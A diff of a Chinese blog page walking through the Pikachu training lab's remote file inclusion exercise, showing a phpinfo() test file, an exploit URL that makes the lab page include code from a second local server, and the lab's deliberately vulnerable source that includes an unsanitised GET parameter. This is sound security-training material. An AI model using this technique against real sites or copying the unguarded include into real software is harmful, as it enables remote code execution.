@@ -56,33 +56,18 @@
     </div>
   </header>
   <div class="article-content">
-    
-# File Inclusion（remote）
-
-1.随便输入球员名字，观察URL发现存在filename=include..文件包含
-
-2.新建一个网站，在网站根目录下新建文本文件，写入php代码
-
+    <h1 id="File-Inclusion（remote）"><a href="#File-Inclusion（remote）" class="headerlink" title="File Inclusion（remote）"></a>File Inclusion（remote）</h1><p>1.随便输入球员名字，观察URL发现存在filename&#x3D;include..文件包含</p>
+<p>2.新建一个网站，在网站根目录下新建文本文件，写入php代码</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">phpinfo</span>();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
 
-![image-20251128162435294](C:\Users\23214\AppData\Roaming\Typora\typora-user-images\image-20251128162435294.png)
-
-![image-20251128162447015](C:\Users\23214\AppData\Roaming\Typora\typora-user-images\image-20251128162447015.png)
-
-3.使用php伪协议访问文件
-
-http://127.0.0.1/pikachu/vul/fileinclude/fi_remote.php?filename=http://127.0.1.1:8088/hack.txt&submit=%E6%8F%90%E4%BA%A4%E6%9F%A5%E8%AF%A2
-
-发现代码执行
-
-![image-20251128162610152](C:\Users\23214\AppData\Roaming\Typora\typora-user-images\image-20251128162610152.png)
-
-# 注：
-
-1.文件的后缀名不能是.php,因为Web服务器会将文件按照PHP代码执行，再将执行的结果返回客户端，这样就拿不到源码
-
-2.源代码分析：
-
+<p><img src="C:\Users\23214\AppData\Roaming\Typora\typora-user-images\image-20251128162435294.png" alt="image-20251128162435294"></p>
+<p><img src="C:\Users\23214\AppData\Roaming\Typora\typora-user-images\image-20251128162447015.png" alt="image-20251128162447015"></p>
+<p>3.使用php伪协议访问文件</p>
+<p><a target="_blank" rel="noopener" href="http://127.0.0.1/pikachu/vul/fileinclude/fi_remote.php?filename=http://127.0.1.1:8088/hack.txt&submit=%E6%8F%90%E4%BA%A4%E6%9F%A5%E8%AF%A2">http://127.0.0.1/pikachu/vul/fileinclude/fi_remote.php?filename=http://127.0.1.1:8088/hack.txt&amp;submit=%E6%8F%90%E4%BA%A4%E6%9F%A5%E8%AF%A2</a></p>
+<p>发现代码执行</p>
+<p><img src="C:\Users\23214\AppData\Roaming\Typora\typora-user-images\image-20251128162610152.png" alt="image-20251128162610152"></p>
+<h1 id="注："><a href="#注：" class="headerlink" title="注："></a>注：</h1><p>1.文件的后缀名不能是.php,因为Web服务器会将文件按照PHP代码执行，再将执行的结果返回客户端，这样就拿不到源码</p>
+<p>2.源代码分析：</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//远程文件包含漏洞,需要php.ini的配置文件符合相关的配置</span></span><br><span class="line"><span class="variable">$html</span>=<span class="string">&#x27;&#x27;</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;submit&#x27;</span>]) &amp;&amp; <span class="variable">$_GET</span>[<span class="string">&#x27;filename&#x27;</span>]!=<span class="literal">null</span>)&#123;</span><br><span class="line">    <span class="variable">$filename</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;filename&#x27;</span>];</span><br><span class="line">    <span class="keyword">include</span> <span class="string">&quot;<span class="subst">$filename</span>&quot;</span>;<span class="comment">//变量传进来直接包含,没做任何的安全限制</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
 
 
